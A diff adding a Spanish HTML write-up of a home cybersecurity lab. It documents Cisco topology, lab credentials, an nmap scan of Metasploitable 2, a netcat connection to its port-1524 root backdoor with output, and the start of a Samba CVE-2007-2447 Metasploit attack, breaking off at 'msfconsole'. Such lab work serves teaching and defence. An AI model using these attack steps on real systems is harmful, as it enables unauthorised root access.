@@ -1,0 +1,1608 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Laboratorio de Ciberseguridad - Documentación Completa</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3e 100%);
+            color: #e0e0e0;
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.7;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 50px 20px;
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.15), rgba(102, 126, 234, 0.15));
+            border-radius: 20px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(0, 212, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(0, 212, 255, 0.1) 0%, transparent 70%);
+            animation: pulse 4s ease-in-out infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+        }
+        
+        .header h1 {
+            font-size: 2.8rem;
+            background: linear-gradient(135deg, #00d4ff, #667eea, #f093fb);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 15px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .header .subtitle {
+            color: #aaa;
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .header .badges {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .header .badge {
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 0.9rem;
+            font-weight: bold;
+        }
+        
+        .badge-red {
+            background: linear-gradient(135deg, #dc3545, #c82333);
+            color: white;
+        }
+        
+        .badge-blue {
+            background: linear-gradient(135deg, #007bff, #0056b3);
+            color: white;
+        }
+        
+        .badge-green {
+            background: linear-gradient(135deg, #28a745, #1e7e34);
+            color: white;
+        }
+        
+        /* Table of Contents */
+        .toc {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .toc h2 {
+            color: #00d4ff;
+            margin-bottom: 25px;
+            font-size: 1.5rem;
+            text-align: center;
+        }
+        
+        .toc-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 15px;
+        }
+        
+        .toc-section {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            padding: 15px;
+        }
+        
+        .toc-section h3 {
+            color: #ffc107;
+            font-size: 1rem;
+            margin-bottom: 10px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(255, 193, 7, 0.3);
+        }
+        
+        .toc a {
+            display: block;
+            padding: 8px 12px;
+            color: #aaa;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            border-radius: 5px;
+            font-size: 0.9rem;
+        }
+        
+        .toc a:hover {
+            background: rgba(0, 212, 255, 0.1);
+            color: #00d4ff;
+            padding-left: 20px;
+        }
+        
+        /* Sections */
+        .section {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        
+        .section h2 {
+            color: #00d4ff;
+            font-size: 1.6rem;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid rgba(0, 212, 255, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .section h3 {
+            color: #ffc107;
+            font-size: 1.2rem;
+            margin: 30px 0 15px 0;
+        }
+        
+        .section h4 {
+            color: #a78bfa;
+            font-size: 1rem;
+            margin: 20px 0 10px 0;
+        }
+        
+        /* Phase Headers */
+        .phase-header {
+            text-align: center;
+            padding: 40px 20px;
+            margin: 40px 0 30px 0;
+            border-radius: 15px;
+            position: relative;
+        }
+        
+        .phase-header.infrastructure {
+            background: linear-gradient(135deg, rgba(40, 167, 69, 0.2), rgba(32, 201, 151, 0.2));
+            border: 2px solid rgba(40, 167, 69, 0.5);
+        }
+        
+        .phase-header.redteam {
+            background: linear-gradient(135deg, rgba(220, 53, 69, 0.2), rgba(255, 87, 34, 0.2));
+            border: 2px solid rgba(220, 53, 69, 0.5);
+        }
+        
+        .phase-header.blueteam {
+            background: linear-gradient(135deg, rgba(0, 123, 255, 0.2), rgba(0, 212, 255, 0.2));
+            border: 2px solid rgba(0, 123, 255, 0.5);
+        }
+        
+        .phase-header h2 {
+            border: none;
+            justify-content: center;
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+        
+        .phase-header p {
+            color: #888;
+            font-size: 1.1rem;
+        }
+        
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            font-size: 0.95rem;
+        }
+        
+        th {
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.2), rgba(102, 126, 234, 0.2));
+            padding: 15px;
+            text-align: left;
+            color: #00d4ff;
+            font-weight: 600;
+            border-bottom: 2px solid rgba(0, 212, 255, 0.3);
+        }
+        
+        td {
+            padding: 12px 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        tr:hover {
+            background: rgba(0, 212, 255, 0.05);
+        }
+        
+        /* Code Blocks */
+        .code-block {
+            background: #0d1117;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 15px 0;
+            overflow-x: auto;
+            border: 1px solid #30363d;
+            position: relative;
+        }
+        
+        .code-block::before {
+            content: attr(data-title);
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            padding: 10px 15px;
+            background: rgba(0, 212, 255, 0.1);
+            color: #00d4ff;
+            font-size: 0.85rem;
+            font-weight: bold;
+            border-radius: 10px 10px 0 0;
+        }
+        
+        .code-block.has-title {
+            padding-top: 55px;
+        }
+        
+        .code-block pre {
+            margin: 0;
+            font-family: 'Consolas', 'Monaco', 'Fira Code', monospace;
+            font-size: 0.9rem;
+            line-height: 1.6;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            color: #e6edf3;
+        }
+        
+        .comment { color: #8b949e; }
+        .command { color: #79c0ff; }
+        .success { color: #7ee787; }
+        .warning { color: #ffa657; }
+        .danger { color: #f85149; }
+        
+        code {
+            background: rgba(110, 118, 129, 0.2);
+            padding: 3px 8px;
+            border-radius: 5px;
+            font-family: 'Consolas', monospace;
+            font-size: 0.85rem;
+            color: #ff79c6;
+        }
+        
+        /* Attack Cards */
+        .attack-card {
+            background: linear-gradient(135deg, rgba(220, 53, 69, 0.1), rgba(0, 0, 0, 0.2));
+            border: 1px solid rgba(220, 53, 69, 0.3);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+        }
+        
+        .attack-card.success {
+            border-color: rgba(40, 167, 69, 0.5);
+            background: linear-gradient(135deg, rgba(40, 167, 69, 0.1), rgba(0, 0, 0, 0.2));
+        }
+        
+        .attack-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .attack-title {
+            font-size: 1.3rem;
+            color: #fff;
+        }
+        
+        .attack-badge {
+            padding: 6px 15px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+        
+        .attack-badge.trivial { background: #28a745; color: white; }
+        .attack-badge.easy { background: #20c997; color: white; }
+        .attack-badge.medium { background: #ffc107; color: black; }
+        .attack-badge.hard { background: #dc3545; color: white; }
+        
+        /* Defense Cards */
+        .defense-card {
+            background: linear-gradient(135deg, rgba(0, 123, 255, 0.1), rgba(0, 0, 0, 0.2));
+            border: 1px solid rgba(0, 123, 255, 0.3);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+        }
+        
+        .defense-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .defense-title {
+            font-size: 1.3rem;
+            color: #fff;
+        }
+        
+        /* Info Boxes */
+        .info-box {
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+        }
+        
+        .info-box.note {
+            background: rgba(0, 212, 255, 0.1);
+            border-left: 4px solid #00d4ff;
+        }
+        
+        .info-box.warning {
+            background: rgba(255, 193, 7, 0.1);
+            border-left: 4px solid #ffc107;
+        }
+        
+        .info-box.success {
+            background: rgba(40, 167, 69, 0.1);
+            border-left: 4px solid #28a745;
+        }
+        
+        .info-box.danger {
+            background: rgba(220, 53, 69, 0.1);
+            border-left: 4px solid #dc3545;
+        }
+        
+        .info-box-icon {
+            font-size: 1.5rem;
+            flex-shrink: 0;
+        }
+        
+        .info-box-content {
+            flex: 1;
+        }
+        
+        .info-box-content strong {
+            display: block;
+            margin-bottom: 8px;
+            color: #fff;
+        }
+        
+        /* Topology */
+        .topology-container {
+            background: #0d1117;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 25px 0;
+            overflow-x: auto;
+            border: 1px solid #30363d;
+        }
+        
+        .topology-diagram {
+            font-family: 'Consolas', monospace;
+            font-size: 0.8rem;
+            line-height: 1.4;
+            color: #8b949e;
+            white-space: pre;
+        }
+        
+        .topology-diagram .device { color: #79c0ff; font-weight: bold; }
+        .topology-diagram .ip { color: #7ee787; }
+        .topology-diagram .vlan { color: #ffa657; }
+        .topology-diagram .link { color: #f85149; }
+        .topology-diagram .vm { color: #f778ba; }
+        
+        /* Results Grid */
+        .results-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+        
+        .result-card {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            padding: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .result-card h4 {
+            color: #00d4ff;
+            margin-bottom: 15px;
+            font-size: 1.1rem;
+        }
+        
+        /* Stats */
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .stat-card {
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.1), rgba(102, 126, 234, 0.1));
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            border: 1px solid rgba(0, 212, 255, 0.2);
+        }
+        
+        .stat-number {
+            font-size: 3rem;
+            font-weight: bold;
+            background: linear-gradient(135deg, #00d4ff, #667eea);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .stat-label {
+            color: #888;
+            font-size: 0.9rem;
+            margin-top: 5px;
+        }
+        
+        /* Screenshot placeholder */
+        .screenshot {
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px dashed rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            padding: 40px;
+            text-align: center;
+            color: #666;
+            margin: 15px 0;
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+            font-size: 0.9rem;
+            margin-top: 50px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .footer a {
+            color: #00d4ff;
+            text-decoration: none;
+        }
+        
+        /* Print */
+        @media print {
+            body {
+                background: #fff;
+                color: #000;
+            }
+            .section {
+                border: 1px solid #ddd;
+                break-inside: avoid;
+            }
+            .code-block {
+                background: #f5f5f5;
+                border: 1px solid #ddd;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        
+        <!-- Header -->
+        <div class="header">
+            <h1>🔐 Laboratorio de Ciberseguridad</h1>
+            <p class="subtitle">Infraestructura Cisco + Red Team & Blue Team | Documentación Completa</p>
+            <div class="badges">
+                <span class="badge badge-green">✓ Infraestructura</span>
+                <span class="badge badge-red">⚔️ Red Team</span>
+                <span class="badge badge-blue">🛡️ Blue Team</span>
+            </div>
+        </div>
+
+        <!-- Statistics -->
+        <div class="stats-container">
+            <div class="stat-card">
+                <div class="stat-number">6</div>
+                <div class="stat-label">Equipos Cisco</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">4</div>
+                <div class="stat-label">Ataques Red Team</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">8</div>
+                <div class="stat-label">Defensas Blue Team</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">3</div>
+                <div class="stat-label">VMs Configuradas</div>
+            </div>
+        </div>
+
+        <!-- Table of Contents -->
+        <div class="toc">
+            <h2>📑 Tabla de Contenidos</h2>
+            <div class="toc-grid">
+                <div class="toc-section">
+                    <h3>🏗️ Etapa 1: Infraestructura</h3>
+                    <a href="#inventario">1.1 Inventario de Equipos</a>
+                    <a href="#topologia">1.2 Topología de Red</a>
+                    <a href="#direccionamiento">1.3 Direccionamiento IP</a>
+                    <a href="#configuraciones">1.4 Configuraciones</a>
+                    <a href="#vms">1.5 Máquinas Virtuales</a>
+                </div>
+                <div class="toc-section">
+                    <h3>⚔️ Etapa 2: Red Team</h3>
+                    <a href="#reconocimiento">2.1 Reconocimiento (Nmap)</a>
+                    <a href="#ataque1">2.2 Backdoor 1524</a>
+                    <a href="#ataque2">2.3 Samba Exploit</a>
+                    <a href="#ataque3">2.4 Tomcat + Escalación</a>
+                    <a href="#ataque4">2.5 Escaneo Windows</a>
+                </div>
+                <div class="toc-section">
+                    <h3>🛡️ Etapa 3: Blue Team</h3>
+                    <a href="#defensa1">3.1 ACL Bloqueo Puertos</a>
+                    <a href="#defensa2">3.2 Port Security</a>
+                    <a href="#defensa3">3.3 SPAN/Mirror</a>
+                    <a href="#defensa4">3.4 Logging Centralizado</a>
+                    <a href="#defensa5">3.5 Snort IDS</a>
+                    <a href="#defensa6">3.6 Wireshark</a>
+                    <a href="#defensa7">3.7 Windows Firewall</a>
+                </div>
+                <div class="toc-section">
+                    <h3>📊 Conclusiones</h3>
+                    <a href="#resumen">4.1 Resumen de Resultados</a>
+                    <a href="#lecciones">4.2 Lecciones Aprendidas</a>
+                    <a href="#mejoras">4.3 Mejoras Futuras</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- ==================== ETAPA 1: INFRAESTRUCTURA ==================== -->
+        <div class="phase-header infrastructure">
+            <h2>🏗️ ETAPA 1: INFRAESTRUCTURA</h2>
+            <p>Configuración de red empresarial multi-sitio con DMZ</p>
+        </div>
+
+        <!-- Inventario -->
+        <div class="section" id="inventario">
+            <h2>📦 1.1 Inventario de Equipos</h2>
+            
+            <table>
+                <thead>
+                    <tr>
+                        <th>Equipo</th>
+                        <th>Modelo</th>
+                        <th>Rol</th>
+                        <th>Interfaces</th>
+                        <th>Acceso Remoto</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>RT-EDGE</strong></td>
+                        <td>Cisco 1941</td>
+                        <td>Router Edge / NAT / Firewall</td>
+                        <td>GE0/0, GE0/1, EHWIC (Gi0/0/0-3)</td>
+                        <td>SSH v2</td>
+                    </tr>
+                    <tr>
+                        <td><strong>RT-HQ</strong></td>
+                        <td>Cisco 1921</td>
+                        <td>Router Sede Principal</td>
+                        <td>GE0/0, GE0/1, HWIC (Fa0/0/0-1)</td>
+                        <td>SSH v2</td>
+                    </tr>
+                    <tr>
+                        <td><strong>RT-BRANCH</strong></td>
+                        <td>Cisco 1921</td>
+                        <td>Router Sucursal</td>
+                        <td>GE0/0, GE0/1</td>
+                        <td>SSH v2</td>
+                    </tr>
+                    <tr>
+                        <td><strong>SW-CORE-HQ</strong></td>
+                        <td>Cisco 3650</td>
+                        <td>Core Switch L3</td>
+                        <td>Gi1/0/1-24</td>
+                        <td>SSH v2</td>
+                    </tr>
+                    <tr>
+                        <td><strong>SW-DMZ</strong></td>
+                        <td>Cisco 2960 PoE</td>
+                        <td>Switch DMZ</td>
+                        <td>Fa0/1-24</td>
+                        <td>Telnet *</td>
+                    </tr>
+                    <tr>
+                        <td><strong>SW-BRANCH</strong></td>
+                        <td>Cisco 2960 PoE+</td>
+                        <td>Switch Sucursal</td>
+                        <td>Gi1/0/25-28 (SFP) **</td>
+                        <td>SSH v2</td>
+                    </tr>
+                </tbody>
+            </table>
+            
+            <div class="info-box warning">
+                <div class="info-box-icon">⚠️</div>
+                <div class="info-box-content">
+                    <strong>Notas importantes</strong>
+                    <p>* SW-DMZ tiene IOS "lanbase" sin soporte criptográfico - solo Telnet disponible</p>
+                    <p>** SW-BRANCH tiene falla en puertos de cobre (1-24) - usar solo puertos SFP (25-28) con módulos GBIC</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Topología -->
+        <div class="section" id="topologia">
+            <h2>🗺️ 1.2 Topología de Red</h2>
+            
+            <div class="topology-container">
+                <div class="topology-diagram">
+                                            ┌──────────────────────┐
+                                            │    <span class="device">☁️ INTERNET/ISP</span>    │
+                                            │   <span class="ip">192.168.100.0/24</span>   │
+                                            └──────────┬───────────┘
+                                                       │
+                                                 <span class="ip">DHCP │ GE0/0</span>
+                                                       │
+                                            ┌──────────┴───────────┐
+                                            │    <span class="device">🔒 RT-EDGE</span>        │
+                                            │      Cisco 1941      │
+                                            │    NAT / Firewall    │
+                                            │    <span class="ip">ACL: PROTECT_DMZ</span>  │
+                                            └──┬───────────────┬───┘
+                                   <span class="ip">10.0.0.1</span>   │               │   <span class="ip">172.16.10.1</span>
+                                      <span class="link">GE0/1</span>   │               │   <span class="link">VLAN10 (SVI)</span>
+                                               │               │
+                         ┌─────────────────────┘               └─────────────────────┐
+                         │                                                           │
+              ┌──────────┴───────────┐                                    ┌──────────┴───────────┐
+              │     <span class="device">🏢 RT-HQ</span>         │                                    │     <span class="device">🛡️ SW-DMZ</span>        │
+              │     Cisco 1921       │                                    │   Cisco 2960 PoE     │
+              │   Router-on-a-Stick  │                                    │  <span class="vlan">VLAN 10 - DMZ</span>       │
+              └──┬──────────┬────────┘                                    │  <span class="ip">172.16.10.0/24</span>     │
+        <span class="ip">10.0.0.2</span> │          │ <span class="ip">10.0.0.5</span>                                  │                      │
+          <span class="link">GE0/0</span>   │          │ <span class="link">Fa0/0/0</span>                                   │  <span class="vm">🖥️ Metasploitable</span>  │
+                  │          │                                            │  <span class="ip">172.16.10.50</span>       │
+    ┌─────────────┘          └─────────────┐                              └──────────────────────┘
+    │ <span class="link">GE0/1 (Trunk)</span>                         │
+    │                                      │
+    │  <span class="vlan">├─ .20 → 172.16.20.1 (Servers)</span>     │
+    │  <span class="vlan">├─ .30 → 172.16.30.1 (Users)</span>       │
+    │  <span class="vlan">└─ .40 → 172.16.40.1 (IT/Admin)</span>    │
+    │                                      │
+┌───┴──────────────────┐        ┌──────────┴───────────┐
+│  <span class="device">🖥️ SW-CORE-HQ</span>       │        │    <span class="device">🏪 RT-BRANCH</span>      │
+│    Cisco 3650        │        │     Cisco 1921       │
+│   <span class="vlan">VLANs 20,30,40</span>     │        │      Sucursal        │
+│   SPAN → Gi1/0/20    │        └──────────┬───────────┘
+│                      │              <span class="ip">10.0.0.6</span> │ <span class="link">GE0/0</span>
+│  <span class="vm">🐉 Kali Linux</span>      │                       │
+│  <span class="ip">172.16.40.50</span>       │                       │ <span class="ip">192.168.50.1</span>
+│                      │                       │ <span class="link">GE0/1</span>
+│  <span class="vm">💻 Windows 11</span>      │                       │
+│  <span class="ip">172.16.30.100</span>      │              ┌────────┴───────────┐
+└──────────────────────┘              │   <span class="device">🏬 SW-BRANCH</span>     │
+                                      │  Cisco 2960 PoE+   │
+    <span class="vlan">VLAN 20: Gi1/0/2-8</span>               │  <span class="vlan">VLAN 50 - Branch</span>  │
+    <span class="vlan">VLAN 30: Gi1/0/9-18</span>              │  <span class="ip">192.168.50.0/24</span>   │
+    <span class="vlan">VLAN 40: Gi1/0/19-24</span>             │  Puertos SFP: 25-28│
+                                      └────────────────────┘
+                </div>
+            </div>
+        </div>
+
+        <!-- Direccionamiento -->
+        <div class="section" id="direccionamiento">
+            <h2>🌐 1.3 Esquema de Direccionamiento</h2>
+            
+            <table>
+                <thead>
+                    <tr>
+                        <th>Segmento</th>
+                        <th>Red</th>
+                        <th>VLAN</th>
+                        <th>Gateway</th>
+                        <th>Propósito</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>WAN (ISP)</td>
+                        <td><code>192.168.100.0/24</code></td>
+                        <td>-</td>
+                        <td>192.168.100.1</td>
+                        <td>Conexión a Internet</td>
+                    </tr>
+                    <tr>
+                        <td>Link Edge-HQ</td>
+                        <td><code>10.0.0.0/30</code></td>
+                        <td>-</td>
+                        <td>-</td>
+                        <td>Enlace punto a punto</td>
+                    </tr>
+                    <tr>
+                        <td>Link HQ-Branch</td>
+                        <td><code>10.0.0.4/30</code></td>
+                        <td>-</td>
+                        <td>-</td>
+                        <td>WAN entre sitios</td>
+                    </tr>
+                    <tr style="background: rgba(220, 53, 69, 0.1);">
+                        <td><strong>DMZ</strong></td>
+                        <td><code>172.16.10.0/24</code></td>
+                        <td>10</td>
+                        <td>172.16.10.1</td>
+                        <td>Metasploitable (víctima)</td>
+                    </tr>
+                    <tr>
+                        <td>Servidores HQ</td>
+                        <td><code>172.16.20.0/24</code></td>
+                        <td>20</td>
+                        <td>172.16.20.1</td>
+                        <td>Servidores internos</td>
+                    </tr>
+                    <tr style="background: rgba(0, 123, 255, 0.1);">
+                        <td><strong>Usuarios HQ</strong></td>
+                        <td><code>172.16.30.0/24</code></td>
+                        <td>30</td>
+                        <td>172.16.30.1</td>
+                        <td>Windows 11 (víctima)</td>
+                    </tr>
+                    <tr style="background: rgba(40, 167, 69, 0.1);">
+                        <td><strong>IT/Admin</strong></td>
+                        <td><code>172.16.40.0/24</code></td>
+                        <td>40</td>
+                        <td>172.16.40.1</td>
+                        <td>Kali Linux (atacante)</td>
+                    </tr>
+                    <tr>
+                        <td>Branch LAN</td>
+                        <td><code>192.168.50.0/24</code></td>
+                        <td>50</td>
+                        <td>192.168.50.1</td>
+                        <td>LAN Sucursal</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Máquinas Virtuales -->
+        <div class="section" id="vms">
+            <h2>🖥️ 1.5 Máquinas Virtuales</h2>
+            
+            <table>
+                <thead>
+                    <tr>
+                        <th>VM</th>
+                        <th>Sistema</th>
+                        <th>VMnet</th>
+                        <th>VLAN</th>
+                        <th>IP</th>
+                        <th>Rol</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>🐉 <strong>Kali Linux</strong></td>
+                        <td>Kali 2026</td>
+                        <td>VMnet0 (Intel Ethernet)</td>
+                        <td>40</td>
+                        <td>172.16.40.50</td>
+                        <td>Atacante</td>
+                    </tr>
+                    <tr>
+                        <td>🎯 <strong>Metasploitable 2</strong></td>
+                        <td>Ubuntu 8.04</td>
+                        <td>VMnet2 (USB Realtek #1)</td>
+                        <td>10</td>
+                        <td>172.16.10.50</td>
+                        <td>Víctima Linux</td>
+                    </tr>
+                    <tr>
+                        <td>💻 <strong>Windows 11</strong></td>
+                        <td>Windows 11 Pro</td>
+                        <td>VMnet3 (USB Realtek #2)</td>
+                        <td>30</td>
+                        <td>172.16.30.100</td>
+                        <td>Víctima Windows</td>
+                    </tr>
+                </tbody>
+            </table>
+            
+            <div class="info-box note">
+                <div class="info-box-icon">💡</div>
+                <div class="info-box-content">
+                    <strong>Configuración VMware</strong>
+                    <p>Cada VMnet está mapeado a un adaptador de red diferente para aislar el tráfico por VLAN. VMnet0 usa el adaptador integrado Intel, VMnet2 y VMnet3 usan adaptadores USB-Ethernet Realtek conectados a diferentes switches.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Credenciales -->
+        <div class="section">
+            <h2>🔑 Credenciales de Acceso</h2>
+            
+            <table>
+                <thead>
+                    <tr>
+                        <th>Equipo</th>
+                        <th>Usuario</th>
+                        <th>Contraseña</th>
+                        <th>Enable Secret</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Equipos Cisco (todos)</td>
+                        <td><code>admin</code></td>
+                        <td><code>AdminSecure123!</code></td>
+                        <td><code>Cisco123!</code></td>
+                    </tr>
+                    <tr>
+                        <td>Metasploitable</td>
+                        <td><code>msfadmin</code></td>
+                        <td><code>msfadmin</code></td>
+                        <td>-</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- ==================== ETAPA 2: RED TEAM ==================== -->
+        <div class="phase-header redteam">
+            <h2>⚔️ ETAPA 2: RED TEAM</h2>
+            <p>Reconocimiento, Explotación y Escalación de Privilegios</p>
+        </div>
+
+        <!-- Reconocimiento -->
+        <div class="section" id="reconocimiento">
+            <h2>🔍 2.1 Reconocimiento (Nmap)</h2>
+            
+            <p>Escaneo completo de Metasploitable 2 para identificar servicios vulnerables:</p>
+            
+            <div class="code-block has-title" data-title="Comando de escaneo">
+<pre><span class="command">nmap -sV -sC -p- 172.16.10.50 -oN metasploitable_scan.txt</span></pre>
+            </div>
+            
+            <h3>Servicios Vulnerables Identificados</h3>
+            
+            <table>
+                <thead>
+                    <tr>
+                        <th>Puerto</th>
+                        <th>Servicio</th>
+                        <th>Versión</th>
+                        <th>Vulnerabilidad</th>
+                        <th>Riesgo</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr style="background: rgba(220, 53, 69, 0.2);">
+                        <td><strong>1524</strong></td>
+                        <td>Bindshell</td>
+                        <td>Metasploitable root shell</td>
+                        <td>Backdoor abierto</td>
+                        <td>🔴 Crítico</td>
+                    </tr>
+                    <tr style="background: rgba(220, 53, 69, 0.15);">
+                        <td><strong>21</strong></td>
+                        <td>FTP</td>
+                        <td>vsftpd 2.3.4</td>
+                        <td>CVE-2011-2523 Backdoor</td>
+                        <td>🔴 Crítico</td>
+                    </tr>
+                    <tr style="background: rgba(220, 53, 69, 0.15);">
+                        <td><strong>445</strong></td>
+                        <td>SMB</td>
+                        <td>Samba 3.0.20</td>
+                        <td>usermap_script RCE</td>
+                        <td>🔴 Crítico</td>
+                    </tr>
+                    <tr style="background: rgba(255, 193, 7, 0.15);">
+                        <td><strong>8180</strong></td>
+                        <td>HTTP</td>
+                        <td>Apache Tomcat 5.5</td>
+                        <td>Default credentials</td>
+                        <td>🟡 Alto</td>
+                    </tr>
+                    <tr>
+                        <td>22</td>
+                        <td>SSH</td>
+                        <td>OpenSSH 4.7p1</td>
+                        <td>Versión obsoleta</td>
+                        <td>🟡 Medio</td>
+                    </tr>
+                    <tr>
+                        <td>3306</td>
+                        <td>MySQL</td>
+                        <td>5.0.51a</td>
+                        <td>Sin autenticación</td>
+                        <td>🟡 Alto</td>
+                    </tr>
+                    <tr>
+                        <td>6667</td>
+                        <td>IRC</td>
+                        <td>UnrealIRCd</td>
+                        <td>Backdoor RCE</td>
+                        <td>🔴 Crítico</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Ataque 1 -->
+        <div class="section" id="ataque1">
+            <h2>💀 2.2 Ataque #1: Backdoor Puerto 1524</h2>
+            
+            <div class="attack-card success">
+                <div class="attack-header">
+                    <span class="attack-title">Backdoor Ingreslock</span>
+                    <span class="attack-badge trivial">Trivial</span>
+                </div>
+                
+                <table>
+                    <tr><td><strong>Objetivo</strong></td><td>172.16.10.50 (Metasploitable)</td></tr>
+                    <tr><td><strong>Puerto</strong></td><td>1524/tcp</td></tr>
+                    <tr><td><strong>Herramienta</strong></td><td>Netcat (nc)</td></tr>
+                    <tr><td><strong>Acceso obtenido</strong></td><td style="color: #28a745;"><strong>root</strong></td></tr>
+                </table>
+                
+                <h4>Ejecución</h4>
+                
+                <div class="code-block has-title" data-title="Comando de ataque">
+<pre><span class="command">nc 172.16.10.50 1524</span>
+
+<span class="success">root@metasploitable:/#</span> whoami
+root
+<span class="success">root@metasploitable:/#</span> id
+uid=0(root) gid=0(root) groups=0(root)</pre>
+                </div>
+                
+                <div class="info-box danger">
+                    <div class="info-box-icon">⚠️</div>
+                    <div class="info-box-content">
+                        <strong>Análisis</strong>
+                        <p>Este es un backdoor intencional dejado en Metasploitable. En un servidor real, representa una falla crítica de seguridad. Un atacante obtiene acceso root inmediato sin necesidad de credenciales ni exploits complejos.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Ataque 2 -->
+        <div class="section" id="ataque2">
+            <h2>💀 2.3 Ataque #2: Samba usermap_script</h2>
+            
+            <div class="attack-card success">
+                <div class="attack-header">
+                    <span class="attack-title">Samba 3.0.20 - CVE-2007-2447</span>
+                    <span class="attack-badge easy">Fácil</span>
+                </div>
+                
+                <table>
+                    <tr><td><strong>Objetivo</strong></td><td>172.16.10.50 (Metasploitable)</td></tr>
+                    <tr><td><strong>Puerto</strong></td><td>445/tcp (SMB)</td></tr>
+                    <tr><td><strong>Herramienta</strong></td><td>Metasploit Framework</td></tr>
+                    <tr><td><strong>Módulo</strong></td><td>exploit/multi/samba/usermap_script</td></tr>
+                    <tr><td><strong>Acceso obtenido</strong></td><td style="color: #28a745;"><strong>root</strong></td></tr>
+                </table>
+                
+                <h4>Ejecución</h4>
+                
+                <div class="code-block has-title" data-title="Metasploit">
+<pre><span class="command">msfconsole</span>
+
